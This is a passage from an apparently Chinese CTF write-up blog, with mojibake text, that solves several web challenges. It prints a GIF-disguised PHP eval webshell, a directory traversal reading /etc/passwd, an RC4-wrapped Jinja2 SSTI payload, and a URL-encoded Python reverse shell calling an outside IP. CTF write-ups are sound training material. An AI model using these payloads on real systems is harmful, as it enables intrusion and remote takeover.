src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724155849917.png"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œè™½ç„¶æœ‰exif_imagetype()æŒ¡ç€ï¼Œä½†æ˜¯å¯ä»¥åœ¨æ–‡ä»¶å¤´å‰åŠ ä¸œè¥¿ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç™»é™†ä¼ ä¸Šå»å°±æœ‰shelläº†ï¼Œåœ°å€å¯ä»¥åœ¨ä¸Šä¼ åçš„å¤´åƒä¸Šçœ‹åˆ°ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724164557410.png"></p><p>ç„¶åè¿›å»æ‹¿flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210724164620663.png"></p><p>å°±å¯ä»¥æ‹¿åˆ°flagäº†</p><blockquote><p>flag{c3944c3a-0d58-4fb3-bb2c-6c8b89290cc3}</p></blockquote><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><h3 id="ç®€å•SSTI"><a href="#ç®€å•SSTI" class="headerlink" title="ç®€å•SSTI"></a>ç®€å•SSTI</h3><p>é¢˜ç›®å¾ˆæ˜æ˜¾çš„ç»™å‡ºäº†æ˜¯flaskï¼Œç”¨arjunçˆ†ä¸€ä¸‹å‚æ•°ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111657215.png"></p><p>å¯ä»¥çŸ¥é“æ³¨å…¥ç‚¹æ˜¯nameï¼Œç®€å•æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111755954.png"></p><p>å¾ˆæ˜æ˜¾æ˜¯jinjia2æ¨¡æ¿ï¼Œç›´æ¥æ‹¿æƒã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111859942.png"></p><p>æ‹¿flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725111923648.png"></p><blockquote><p>flag{d4f17600-d22b-4bc9-95d4-eda38ea5df04}</p></blockquote><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><h3 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h3><p>é¢˜ç›®ç»™äº†ä¸ªurlå‚æ•°ï¼Œè¯•äº†è¯•å‘ç°å¯ä»¥ç›®å½•ç©¿è¶Šè¯»ä¸œè¥¿ï¼Œç›´æ¥çœ‹/etc/passwd/</p><blockquote><p>?url=../../../../etc/passwd</p></blockquote><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">app:x:1000:1000::&#x2F;home&#x2F;app:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹/proc/self/cmdlineï¼Œ<a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">/proc/selfåŸç†åœ¨è¿™é‡Œ</a>ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 app.py </span><br></pre></td></tr></table></figure><p>è¯´æ˜æœ‰app.pyå­˜åœ¨ï¼Œç›´æ¥æ‹¿ã€‚</p><blockquote><p>?url=app.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç»™shelläº†ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œè€Œä¸”keyçš„secret.txtè¢«åˆ æ‰äº†ï¼Œç„¶åè¿™é‡Œå¯ä»¥çœ‹/proc/self/fd/$pidï¼Œè¿™ä¸ªåŸç†ä¹Ÿåœ¨ä¸Šé¢ã€‚</p><p>ç„¶åçˆ†ç ´ä¸€ä¸‹secret.txtçš„$pidï¼Œæˆ‘è¿™è¾¹çˆ†å‡ºæ¥æ˜¯3ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725154830215.png"></p><p>è¿™ä¸‹keyå°±æœ‰äº†ï¼Œç„¶åå°±æ˜¯æ‹¿shelläº†ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©åå¼¹shellï¼Œpythoné‡Œé¢çš„å˜›ï¼Œå°±ç”¨pythonå¼¹ï¼Œ<a href="https://blog.csdn.net/weixin_39890543/article/details/112989316">åŸç†çœ‹è¿™é‡Œ</a>ã€‚</p><p>tips: é‡å¼€è¿‡ä¸€æ¬¡é¶æœºï¼Œæ‰€ä»¥keyä¸ä¸€æ ·ï¼Œè®°å¾—è¦urlç¼–ç (å¯¹äº†ï¼Œå¦‚æœæ˜¯æ‹¿è‡ªå·±çš„æœåŠ¡å™¨åå¼¹shellçš„è¯ï¼Œè¦è®°å¾—å¼€æ”¾ç«¯å£ã€‚</p><blockquote><p>?key=AuSDLlY07BCOCurV2ZQerfSDZ1ExvuICcJgh0ewklTw%3D&amp;shell=python3%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22116%2E62%2E243%2E231%22%2C1234%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210725155859971.png"></p><p>æ‹¿åˆ°flagã€‚</p><blockquote><p>flag{61c36378-9daa-4176-94bf-1e1006d05c4b}</p></blockquote><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p>æœ‰ç‚¹åƒå¯†ç é¢˜(x</p><p>é¢˜ç›®åˆšè¿›æ¥ç»™äº†å¥<code>Welcome To Find Secret</code>ï¼Œç„¶åæˆ‘å°±å¥½å¥‡å¿ƒä½¿ç„¶(åªèƒ½è¯´å¥½å¥‡ä¸€ç‚¹ç‚¹ï¼Œä¸èƒ½å†å¤šäº†ï¼Œå»çœ‹äº†çœ‹/secretã€‚</p><p>ç»“æœæœ‰ä¸€å¥<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>ï¼Œæ˜ç¤ºäº†å—·ï¼Œå¡«ä¸ªsecretå‚æ•°çœ‹çœ‹ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726102853857.png"></p><p>ä¸å¯¹å¤´ï¼Œå¾ˆæ˜æ˜¾è¢«åŠ å¯†äº†ï¼Œéšä¾¿å¡«ç‚¹ä¸œè¥¿ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210726103051321.png"></p><p>å‘ç°ç›´æ¥æŠ¥é”™äº†ï¼Œè€Œä¸”ç»™äº†æºç ï¼Œé‚£å°±å¥½è¯´è¯äº†ï¼Œsecretå…ˆæ˜¯ä¼šè¢«RC4è§£å¯†ï¼Œç„¶åå†ç»è¿‡<code>render_template_string</code>æ¨¡æ¿æ¸²æŸ“ï¼Œé‚£è¿™å°±æ˜¯å¾ˆæ˜æ˜¾çš„æ¨¡æ¿æ³¨å…¥äº†ï¼Œä½†æ˜¯è¦å…ˆRC4åŠ å¯†æ‰èƒ½æ­£ç¡®è¾“å…¥payloadã€‚</p><p>å¯ä»¥ç½‘ä¸Šéšä¾¿æ‰¾ä¸ªè„šæœ¬è¿›è¡ŒåŠ å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key=<span class="string">&quot;init_key&quot;</span>, message=<span class="string">&quot;init_message&quot;</span></span>):</span>  <span class="comment"># è¿”å›åŠ å¯†åå¾—å†…å®¹</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span></span><br><span class="line">message = <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">enc_base64 = rc4_main(key, message)</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;</span> + enc_url)</span><br><span class="line"><span class="comment"># print(&quot;rc4åŠ å¯†åçš„base64ç¼–ç &quot;+enc_base64)</span></span><br></pre></td></tr></table></figure><p>æ¨¡æ¿æ³¨å…¥æ²¡banå•¥ä¸œè¥¿ï¼Œç›´æ¥æ‹¿flagå°±æ˜¯äº†ã€‚</p><blockquote><p>flag{3bc3cf51-2658-4f98-93dc-a206fcb3048e}</p></blockquote><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>åªèƒ½è¯´è¿™é¢˜ï¼Œé‡å¤´æˆä¹‹é‡ä¸­ä¹‹é‡ã€‚</p><p>è¿›å…¥é¢˜ç›®ä¹‹åå¯ä»¥åœ¨é¡µé¢æºä»£ç ä¸­çœ‹åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Here is the real page =w= --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</span></span><br></pre></td></tr></table></figure><p>å°†<code>GFXEIM3YFZYGQ4A=</code>è¿›è¡Œbase64è§£ç åå¯ä»¥å¾—åˆ°ä¸€ä¸ª<code>1nD3x.php</code>ï¼Œè¿›å…¥åç›´æ¥ç»™å‡ºäº†æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’±ä¸€ä¸ªä¸€ä¸ªçœ‹ã€‚</p><h3 id="SERVER-â€˜QUERY-STRINGâ€™-æ­£åˆ™ç»•è¿‡"><a href="#SERVER-â€˜QUERY-STRINGâ€™-æ­£åˆ™ç»•è¿‡" class="headerlink" title="$_SERVER[â€˜QUERY_STRINGâ€™]æ­£åˆ™ç»•è¿‡"></a>$_SERVER[â€˜QUERY_STRINGâ€™]æ­£åˆ™ç»•è¿‡</h3><p>å…ˆè§£é‡Šä¸€ä¸‹$_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œè¿™ä¸ªç®€å•æµ‹è¯•ä¸€ä¸‹å°±å¯ä»¥å‘ç°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;aaa&quot;</span><br><span class="line">ç»“æœ:</span><br><span class="line">    $_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">url 